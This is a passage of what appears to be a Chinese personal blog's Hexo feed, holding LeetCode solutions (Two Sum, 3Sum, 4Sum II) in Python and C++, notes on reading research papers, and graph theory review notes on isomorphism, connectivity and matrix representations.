punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">,</span> nums3<span class="token punctuation">:</span> <span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">,</span> nums4<span class="token punctuation">:</span> <span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        n<span class="token operator">=</span>len<span class="token punctuation">(</span>nums1<span class="token punctuation">)</span>        hash<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;# 记录遍历 nums1,nums2中和的值  键：num1+nums2   值：nums1+nums2出现的次数</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                temp<span class="token operator">=</span>nums1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>nums2<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token keyword">if</span> temp <span class="token keyword">in</span> hash<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#表示在hash 中出现过 value+=1</span>                    hash<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 没有出现 添加到hash中，value 设为1</span>                    hash<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>        result<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 遍历nums3 和nums4</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                temp<span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span>nums3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>nums4<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> temp <span class="token keyword">in</span> hash<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 出现在hash中</span>                    result<span class="token operator">+=</span>hash<span class="token punctuation">[</span>temp<span class="token punctuation">]</span>        <span class="token keyword">return</span> result</code></pre><blockquote><p>c++</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int fourSumCount(vector<int>& nums1, vector<int>& nums2, vector<int>& nums3, vector<int>& nums4) &#123;        unordered_map<int,int> ans;        int sum=0;        int length=nums1.size();        for(int i=0;i<length;i++)            for(int j=0;j<length;j++)&#123;                int temp=nums1[i]+nums2[j];                ans[temp]++;            &#125;         for(int i=0;i<length;i++)            for(int j=0;j<length;j++)&#123;                int temp=nums3[i]+nums4[j];                sum+=ans[-temp];            &#125;        return sum;    &#125;;&#125;;</code></pre><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201425527.png" alt="image-20230228091044307"></p>]]></content>
      
      
      
        <tags>
            
            <tag> hash </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阅读文献</title>
      <link href="/2023/02/27/%E8%AF%BB%E8%AE%BA%E6%96%87/"/>
      <url>/2023/02/27/%E8%AF%BB%E8%AE%BA%E6%96%87/</url>
      
        <content type="html"><![CDATA[<h2 id="论文笔记"><a href="#论文笔记" class="headerlink" title="论文笔记"></a>论文笔记</h2><ol><li>创新点</li><li>模型</li><li>方法</li><li>文献评价</li><li>思考 找idea</li></ol><p><strong><code>重点：读论文一下读完。不要歇着读。</code></strong></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201424644.png" alt="image-20230228191456892"></p><h2 id="重点论文"><a href="#重点论文" class="headerlink" title="重点论文"></a>重点论文</h2><ol><li>标题</li><li>摘要</li><li>introduction</li><li>模型</li></ol><h2 id="选择性文献"><a href="#选择性文献" class="headerlink" title="选择性文献"></a>选择性文献</h2><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201424757.png" alt="image-20230228191308756"></p><h2 id="论文结构"><a href="#论文结构" class="headerlink" title="论文结构"></a>论文结构</h2><h3 id="1-摘要"><a href="#1-摘要" class="headerlink" title="1.摘要"></a>1.摘要</h3><p><strong><code>内容：研究背景， 主要目的，现象和结论， 意义和价值</code></strong></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201424855.png" alt="image-20230228191105160"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201424422.png" alt="image-20230228191048281"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>15. 三数之和</title>
      <link href="/2023/02/27/15-%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
      <url>/2023/02/27/15-%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class=" language-c++"><code class="language-c++">给你一个整数数组 nums ，判断是否存在三元组 [nums[i], nums[j], nums[k]] 满足 i != j、i != k 且 j != k ，同时还满足 nums[i] + nums[j] + nums[k] == 0 。请你返回所有和为 0 且不重复的三元组。注意：答案中不可以包含重复的三元组。来源：力扣（LeetCode）链接：https://leetcode.cn/problems/3sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-c++"><code class="language-c++">示例 1：输入：nums = [-1,0,1,2,-1,-4]输出：[[-1,-1,2],[-1,0,1]]解释：nums[0] + nums[1] + nums[2] = (-1) + 0 + 1 = 0 。nums[1] + nums[2] + nums[4] = 0 + 1 + (-1) = 0 。nums[0] + nums[3] + nums[4] = (-1) + 2 + (-1) = 0 。不同的三元组是 [-1,0,1] 和 [-1,-1,2] 。注意，输出的顺序和三元组的顺序并不重要。示例 2：输入：nums = [0,1,1]输出：[]解释：唯一可能的三元组和不为 0 。示例 3：输入：nums = [0,0,0]输出：[[0,0,0]]解释：唯一可能的三元组和为 0 。 提示：3 <= nums.length <= 3000-105 <= nums[i] <= 105通过次数1,274,331提交次数3,466,838来源：力扣（LeetCode）链接：https://leetcode.cn/problems/3sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><blockquote><p>思路</p></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201425864.png" alt="image-20230227180743101"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201425405.png" alt="image-20230227165054089"></p><pre><code></code></pre><blockquote><p>python</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">threeSum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> <span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        nums<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 排序升序</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># nums[k],nums[k+1],nums[k+2] 都大于0 不可能存在等于0</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> k<span class="token operator">></span><span class="token number">0</span> <span class="token operator">and</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>k<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 因为nums[k-1] 计算的结果包含了 nums[k] 为了去重</span>                <span class="token keyword">continue</span>            l<span class="token operator">=</span>k<span class="token operator">+</span><span class="token number">1</span> <span class="token comment" spellcheck="true"># 定义左指针</span>            r<span class="token operator">=</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token comment" spellcheck="true"># 定义右指针</span>            <span class="token keyword">while</span> l<span class="token operator">&lt;</span>r<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#  不能包含等于号</span>                temp<span class="token operator">=</span>nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">+</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token operator">+</span>nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 请三个数的和</span>                <span class="token keyword">if</span>  temp<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#符合条件三个数和等于0</span>                    result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    l<span class="token operator">+=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#l后移一位</span>                    r<span class="token operator">-=</span><span class="token number">1</span><span class="token comment" spellcheck="true"># r前一位</span>                    <span class="token keyword">while</span> l<span class="token operator">&lt;</span>r <span class="token operator">and</span> nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>l<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 如果 append 是l 现在这里面的l为l+1 即 重复所以继续l++</span>                        l<span class="token operator">+=</span><span class="token number">1</span>                    <span class="token keyword">while</span> l<span class="token operator">&lt;</span>r <span class="token operator">and</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>r<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                        r<span class="token operator">-=</span><span class="token number">1</span>                <span class="token keyword">elif</span> temp<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 如果值小于0 表示要指针值超大的方向 移动 所以稚嫩给移动左指针</span>                    l<span class="token operator">+=</span><span class="token number">1</span>                                   <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 值大于0  表示要指针值超小的方向 移动 所以稚嫩给移动右指针</span>                    r<span class="token operator">-=</span><span class="token number">1</span>        <span class="token keyword">return</span> result</code></pre><blockquote><p>c++</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<vector<int>> threeSum(vector<int>& nums) &#123;        vector<vector<int>> result;        sort(nums.begin(), nums.end());        // 找出a + b + c = 0        // a = nums[i], b = nums[left], c = nums[right]        for (int i = 0; i < nums.size(); i++) &#123;            // 排序之后如果第一个元素已经大于零，那么无论如何组合都不可能凑成三元组，直接返回结果就可以了            if (nums[i] > 0) &#123;                return result;            &#125;            // 错误去重方法，将会漏掉-1,-1,2 这种情况            /*            if (nums[i] == nums[i + 1]) &#123;                continue;            &#125;            */            // 正确去重方法            if (i > 0 && nums[i] == nums[i - 1]) &#123;                continue;            &#125;            int left = i + 1;            int right = nums.size() - 1;            while (right > left) &#123;                // 去重复逻辑如果放在这里，0，0，0 的情况，可能直接导致 right<=left 了，从而漏掉了 0,0,0 这种三元组                if (nums[i] + nums[left] + nums[right] > 0) &#123;                    right--;                &#125; else if (nums[i] + nums[left] + nums[right] < 0) &#123;                    left++;                &#125; else &#123;                    result.push_back(vector<int>&#123;nums[i], nums[left], nums[right]&#125;);                    // 去重逻辑应该放在找到一个三元组之后                    while (right > left && nums[right] == nums[right - 1]) right--;                    while (right > left && nums[left] == nums[left + 1]) left++;                    // 找到答案时，双指针同时收缩                    right--;                    left++;                &#125;            &#125;        &#125;        return result;    &#125;&#125;;</code></pre><blockquote><p>复杂度分析</p></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201425632.png" alt="image-20230227165251147"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://leetcode.cn/problems/3sum/solution/pai-xu-shuang-zhi-zhen-zhu-xing-jie-shi-python3-by/">排序 + 双指针，逐行解释 - 三数之和 - 力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/problems/3sum/solution/3sumpai-xu-shuang-zhi-zhen-yi-dong-by-jyd/">三数之和（排序+双指针，易懂图解） - 三数之和 - 力扣（LeetCode）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 双指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1. 两数之和</title>
      <link href="/2023/02/27/1-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
      <url>/2023/02/27/1-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode.cn/problems/two-sum/">1. 两数之和</a></h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class=" language-c++"><code class="language-c++">给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。你可以按任意顺序返回答案来源：力扣（LeetCode）链接：https://leetcode.cn/problems/two-sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-python"><code class="language-python">示例 <span class="token number">1</span>：输入：nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target <span class="token operator">=</span> <span class="token number">9</span>输出：<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>解释：因为 nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">9</span> ，返回 <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span> 。示例 <span class="token number">2</span>：输入：nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target <span class="token operator">=</span> <span class="token number">6</span>输出：<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>示例 <span class="token number">3</span>：输入：nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target <span class="token operator">=</span> <span class="token number">6</span>输出：<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>two<span class="token operator">-</span>sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1.暴力破解"></a>1.暴力破解</h3><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<int> twoSum(vector<int>& nums, int target) &#123;        int length=nums.size();        vector<int>ans;        int i,j;        for(i=0;i<length;i++)            for(j=i+1;j<length;j++)            if((nums[i]+nums[j])==target)&#123;                ans.emplace_back(i);                ans.emplace_back(j);                return ans;            &#125;        return ans;    &#125;&#125;;</code></pre><blockquote><p>复杂度分析</p></blockquote><pre class=" language-c++"><code class="language-c++">时间复杂度：O(N^2)，其中 N 是数组中的元素数量。最坏情况下数组中任意两个数都要被匹配一次。空间复杂度：O(1)。</code></pre><h3 id="2-hash表"><a href="#2-hash表" class="headerlink" title="2. hash表"></a>2. hash表</h3><blockquote><p>思路</p></blockquote><pre class=" language-c++"><code class="language-c++">哈希表map用来保存一个数，另一个数在遍历nums的时候和map中的数尝试求和是否为target，如果求和不满足则存入map，继续遍历nums。</code></pre><blockquote><p>算法</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token number">1</span><span class="token punctuation">.</span> 遍历数组nums，i为当前下标，每个值都判断map中是否存在target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>的值<span class="token number">2</span><span class="token punctuation">.</span> 如果不存在则将当前的 <span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">]</span>存入map中，继续遍历直到找到为止<span class="token number">3</span><span class="token punctuation">.</span> 如果存在则找到了两个值并返回</code></pre><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<int> twoSum(vector<int>& nums, int target) &#123;        unordered_map<int,int> ans;        vector<int> result;        for(int i=0;i<nums.size();i++)&#123;            int temp=target-nums[i];            if(ans.find(temp)!=ans.end())&#123;                result.emplace_back(ans[temp]);                result.emplace_back(i);                return result;            &#125;            ans[nums[i]]=i;        &#125;        return result;      &#125;&#125;;</code></pre><blockquote><p> 复杂度分析</p></blockquote><pre class=" language-c++"><code class="language-c++">时间复杂度：O(N)，其中N是数组中的元素数量。对于每一个元素nums[i]，我们可以O(1)地寻找target - nums[i]。空间复杂度：O(N)，其中N是数组中的元素数量。主要为哈希表的开销。</code></pre><h2 id="题解分析"><a href="#题解分析" class="headerlink" title="题解分析"></a>题解分析</h2><p><a href="https://leetcode.cn/problems/two-sum/solution/suo-you-ti-jie-de-mu-lu-lian-jie-si-wei-ecnoo/">❤️所有题解的目录链接: 思维导图整理大厂面试高频题(持续更新中)❤️ - 两数之和 - 力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/problems/two-sum/solution/dong-hua-ti-jie-by-linsen80586-dwil/">算法动画：两数之和（哈希表） - 两数之和 - 力扣（LeetCode）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> hash </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/02/26/%E5%9B%BE%E8%AE%BA%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/02/26/%E5%9B%BE%E8%AE%BA%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="同构"><a href="#同构" class="headerlink" title="同构"></a>同构</h2><h3 id="判断同构"><a href="#判断同构" class="headerlink" title="判断同构"></a>判断同构</h3><blockquote><p> 充分条件</p></blockquote><p>两个图的点集与边集之间分别存在一一对应关系（相同的关系E）</p><blockquote><p>必要条件</p></blockquote><p>（1）.结点数相等。</p><p>（2）.边数相等。</p><p>（3）.对应节点的度相等（包括进度和出度）</p><p>   (4) .节点对应的关系相同（包括重边和环）</p><p>（5）.在权值图与有向图内，各边的权值和对应的关系相同</p><p>判断方法：</p><ol><li><p>通过图的<a href="https://so.csdn.net/so/search?q=%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5&spm=1001.2101.3001.7020">邻接矩阵</a>来判断.一个图的邻接矩阵通过搜索，经过有限次的互换行或列的变换获得的映射关系E1，E2，如果E1 与 E2相等,则这两图同构。</p></li><li><p>必要条件</p><h2 id="图连通性"><a href="#图连通性" class="headerlink" title="图连通性"></a>图连通性</h2><h3 id="连通性定义"><a href="#连通性定义" class="headerlink" title="连通性定义"></a>连通性定义</h3><p>图G，连通分支数个数记为 W（G）</p><p>一个无向图G=, 如果它的<strong>任何两点均</strong> 是<strong>可达的</strong>,则称图G为连通图，否则称为非连通图。</p><h3 id="可达性定义"><a href="#可达性定义" class="headerlink" title="可达性定义"></a>可达性定义</h3><p>在一个有向图D中，<strong>若从顶点vi到vj存在通路</strong>，则称<strong>vi可达 vj</strong>。规定<strong>vi到自身总是可达的</strong></p><h3 id="强连通图"><a href="#强连通图" class="headerlink" title="强连通图"></a>强连通图</h3><p>D中<strong>任何一对顶点</strong>都是<strong>相互可达的</strong>,则称D是强连通图</p><h3 id="单向联通图"><a href="#单向联通图" class="headerlink" title="单向联通图"></a>单向联通图</h3><p>若D中<strong>任意两点至少一个可达另一个</strong>,则称D是单向连通图。</p><h3 id="连通图"><a href="#连通图" class="headerlink" title="连通图"></a>连通图</h3><p>若<strong>略去D中各有向边的方向</strong>后<strong>所得无向图G</strong>是连通图,<strong>则称D 是连通图</strong>，或称D是弱连通图，简称为连通图</p><h3 id="点连通性"><a href="#点连通性" class="headerlink" title="点连通性"></a>点连通性</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214221122.png" alt="image-20230214221122908"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214221111.png" alt="image-20230214221103964"></p><p><strong>无向连通图的点连通度的物理意义是：要使G成 为不连通的最少要删除的结点数。如果一个图的点 连通度是1，最少删除一个结点，图变为不连通的</strong>。</p><h3 id="边连通性"><a href="#边连通性" class="headerlink" title="边连通性"></a>边连通性</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214221458.png" alt="image-20230214221458584"></p><p><strong>无向连通图的边连通度的物理意义是：要使G 成为不连通的最少要删除的边数</strong></p><h2 id="二部图"><a href="#二部图" class="headerlink" title="二部图"></a>二部图</h2><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214221832.png" alt="image-20230214221832418"></p></li></ol><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222122.png" alt="image-20230214222122724"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222153.png" alt="image-20230214222153433"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222311.png" alt="image-20230214222311388"></p><h2 id="图的矩阵表示"><a href="#图的矩阵表示" class="headerlink" title="图的矩阵表示"></a>图的矩阵表示</h2><h3 id="关联矩阵"><a href="#关联矩阵" class="headerlink" title="关联矩阵"></a>关联矩阵</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222557.png" alt="image-20230214222557337"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222710.png" alt="image-20230214222710772"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222818.png" alt="image-20230214222818688"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223102.png" alt="image-20230214223102472"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223241.png" alt="image-20230214223241106"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223524.png" alt="image-20230214223524854"></p><h3 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223714.png" alt="image-20230214223714069"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223807.png" alt="image-20230214223807728"></p><h3 id="可达矩阵"><a href="#可达矩阵" class="headerlink" title="可达矩阵"></a>可达矩阵</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223946.png" alt="image-20230214223946425"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230215090207.png" alt="image-20230215090207337"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230215090223.png" alt="image-20230215090223410"></p><p><img src="20230215090223.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/02/26/%E5%90%8C%E6%9E%84/"/>
      <url>/2023/02/26/%E5%90%8C%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="同构"><a href="#同构" class="headerlink" title="同构"></a>同构</h2><h3 id="判断同构"><a href="#判断同构" class="headerlink" title="判断同构"></a>判断同构</h3><blockquote><p> 充分条件</p></blockquote><p>两个图的点集与边集之间分别存在一一对应关系（相同的关系E）</p><blockquote><p>必要条件</p></blockquote><p>（1）.结点数相等。</p><p>（2）.边数相等。</p><p>（3）.对应节点的度相等（包括进度和出度）</p><p>   (4) .节点对应的关系相同（包括重边和环）</p><p>（5）.在权值图与有向图内，各边的权值和对应的关系相同</p><p>判断方法：</p><ol><li><p>通过图的<a href="https://so.csdn.net/so/search?q=%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5&spm=1001.2101.3001.7020">邻接矩阵</a>来判断.一个图的邻接矩阵通过搜索，经过有限次的互换行或列的变换获得的映射关系E1，E2，如果E1 与 E2相等,则这两图同构。</p></li><li><p>必要条件</p><h2 id="图连通性"><a href="#图连通性" class="headerlink" title="图连通性"></a>图连通性</h2><h3 id="连通性定义"><a href="#连通性定义" class="headerlink" title="连通性定义"></a>连通性定义</h3><p>图G，连通分支数个数记为 W（G）</p><p>一个无向图G=, 如果它的<strong>任何两点均</strong> 是<strong>可达的</strong>,则称图G为连通图，否则称为非连通图。</p><h3 id="可达性定义"><a href="#可达性定义" class="headerlink" title="可达性定义"></a>可达性定义</h3><p>在一个有向图D中，<strong>若从顶点vi到vj存在通路</strong>，则称<strong>vi可达 vj</strong>。规定<strong>vi到自身总是可达的</strong></p><h3 id="强连通图"><a href="#强连通图" class="headerlink" title="强连通图"></a>强连通图</h3><p>D中<strong>任何一对顶点</strong>都是<strong>相互可达的</strong>,则称D是强连通图</p><h3 id="单向联通图"><a href="#单向联通图" class="headerlink" title="单向联通图"></a>单向联通图</h3><p>若D中<strong>任意两点至少一个可达另一个</strong>,则称D是单向连通图。</p><h3 id="连通图"><a href="#连通图" class="headerlink" title="连通图"></a>连通图</h3><p>若<strong>略去D中各有向边的方向</strong>后<strong>所得无向图G</strong>是连通图,<strong>则称D 是连通图</strong>，或称D是弱连通图，简称为连通图</p><h3 id="点连通性"><a href="#点连通性" class="headerlink" title="点连通性"></a>点连通性</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214221122.png" alt="image-20230214221122908"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214221111.png" alt="image-20230214221103964"></p><p><strong>无向连通图的点连通度的物理意义是：要使G成 为不连通的最少要删除的结点数。如果一个图的点 连通度是1，最少删除一个结点，图变为不连通的</strong>。</p><h3 id="边连通性"><a href="#边连通性" class="headerlink" title="边连通性"></a>边连通性</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214221458.png" alt="image-20230214221458584"></p><p><strong>无向连通图的边连通度的物理意义是：要使G 成为不连通的最少要删除的边数</strong></p><h2 id="二部图"><a href="#二部图" class="headerlink" title="二部图"></a>二部图</h2><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214221832.png" alt="image-20230214221832418"></p></li></ol><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222122.png" alt="image-20230214222122724"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222153.png" alt="image-20230214222153433"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222311.png" alt="image-20230214222311388"></p><h2 id="图的矩阵表示"><a href="#图的矩阵表示" class="headerlink" title="图的矩阵表示"></a>图的矩阵表示</h2><h3 id="关联矩阵"><a href="#关联矩阵" class="headerlink" title="关联矩阵"></a>关联矩阵</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222557.png" alt="image-20230214222557337"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222710.png" alt="image-20230214222710772"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214222818.png" alt="image-20230214222818688"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223102.png" alt="image-20230214223102472"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223241.png" alt="image-20230214223241106"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223524.png" alt="image-20230214223524854"></p><h3 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" 